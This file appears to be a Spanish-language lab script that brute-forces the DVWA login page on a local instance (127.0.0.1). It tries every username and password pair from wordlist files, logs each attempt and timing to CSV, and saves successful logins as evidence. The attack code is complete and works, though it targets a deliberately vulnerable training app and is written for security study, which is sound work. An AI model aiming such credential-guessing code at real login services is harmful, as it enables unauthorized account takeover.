#!/usr/bin/env python3
"""Prueba de diccionario para el DVWA local del laboratorio, seguridad Low."""

import csv
import hashlib
import html
import json
import os
from pathlib import Path
import sys
from datetime import datetime, timezone
from time import perf_counter

import requests


ROOT = Path(__file__).resolve().parent
URL = "http://127.0.0.1:4280/vulnerabilities/brute/"


def leer_lista(nombre):
    return list(dict.fromkeys(
        linea for linea in (ROOT / nombre).read_text().splitlines() if linea
    ))


def clasificar(respuesta, usuario):
    if respuesta.status_code != 200:
        raise RuntimeError(f"HTTP {respuesta.status_code}: sesión expirada o error")
    cuerpo = html.unescape(respuesta.text)
    if f"Welcome to the password protected area {usuario}</p>" in cuerpo:
        return "valido"
    if "Username and/or password incorrect." in cuerpo:
        return "invalido"
    raise RuntimeError("Respuesta inesperada: comprobar sesión y seguridad Low")


def main():
    cookie = os.environ.get("DVWA_SESSION")
    if not cookie:
        raise RuntimeError("Define DVWA_SESSION con el PHPSESSID del navegador")
    usuarios = leer_lista("usuarios-reducidos.txt")
    claves = leer_lista("contrasenas-reducidas.txt")
    if not usuarios or not claves:
        raise RuntimeError("Los diccionarios no pueden estar vacíos")
    salida = ROOT / "evidencias" / "python" / datetime.now().strftime("%Y%m%d-%H%M%S-%f")
    salida.mkdir(parents=True)
    aciertos = []
    intentos = 0
    error = None
    inicio_utc = datetime.now(timezone.utc).isoformat()

    with requests.Session() as sesion:
        # Usar directamente el DVWA local, sin proxies del entorno.
        sesion.trust_env = False
        sesion.cookies.set("PHPSESSID", cookie, domain="127.0.0.1", path="/")
        sesion.cookies.set("security", "low", domain="127.0.0.1", path="/")
        sesion.headers.update({"Accept": "text/html"})
        # Control negativo fuera del tiempo medido; no seguir redirecciones al login.
        control = sesion.get(URL, params={"username": "control_inexistente_lab",
                            "password": "control_invalido_lab", "Login": "Login"},
                            timeout=10, allow_redirects=False)
        if clasificar(control, "control_inexistente_lab") != "invalido":
            raise RuntimeError("El control negativo no falló como se esperaba")
        (salida / "control-invalido.html").write_text(control.text)

        inicio = perf_counter()
        with (salida / "intentos.csv").open("w", newline="") as archivo:
            writer = csv.writer(archivo)
            writer.writerow(["intento", "usuario", "contrasena", "http", "segundos", "resultado"])
            try:
                for usuario in usuarios:
                    for clave in claves:
                        intento_inicio = perf_counter()
                        intentos += 1
                        respuesta = sesion.get(URL, params={"username": usuario,
                                               "password": clave, "Login": "Login"},
                                               timeout=10, allow_redirects=False)
                        segundos = perf_counter() - intento_inicio
                        resultado = clasificar(respuesta, usuario)
                        writer.writerow([intentos, usuario, clave, respuesta.status_code,
                                         f"{segundos:.6f}", resultado])
                        if resultado == "valido":
                            aciertos.append({"usuario": usuario, "contrasena": clave,
                                             "intento": intentos})
                            (salida / f"valido-{intentos}.html").write_text(respuesta.text)
                            print(f"[+] {usuario} / {clave} (intento {intentos})", flush=True)
                        if intentos % 500 == 0:
                            print(f"Progreso: {intentos}/{len(usuarios) * len(claves)}", flush=True)
            except (requests.RequestException, RuntimeError, KeyboardInterrupt) as exc:
                error = type(exc).__name__ + ": " + str(exc)
        duracion = perf_counter() - inicio

    resumen = {
        "inicio_utc": inicio_utc, "url": URL, "requests_version": requests.__version__,
        "user_agent": requests.utils.default_user_agent(), "concurrencia": 1,
        "usuarios": len(usuarios), "contrasenas": len(claves),
        "combinaciones": len(usuarios) * len(claves), "intentos_iniciados": intentos,
        "control_previo": 1, "duracion_segundos": duracion,
        "intentos_por_segundo": intentos / duracion if not error else None,
        "completo": error is None, "error": error, "aciertos": aciertos,
        "sha256": {nombre: hashlib.sha256((ROOT / nombre).read_bytes()).hexdigest()
                   for nombre in ("usuarios-reducidos.txt", "contrasenas-reducidas.txt")},
    }
    (salida / "resumen.json").write_text(json.dumps(resumen, indent=2) + "\n")
    print(json.dumps(resumen, indent=2))
    print(f"Evidencias: {salida}")
    return 1 if error else 0


if __name__ == "__main__":
    try:
        sys.exit(main())
    except (requests.RequestException, RuntimeError, OSError) as exc:
        print(f"Error: {exc}", file=sys.stderr)
        sys.exit(1)
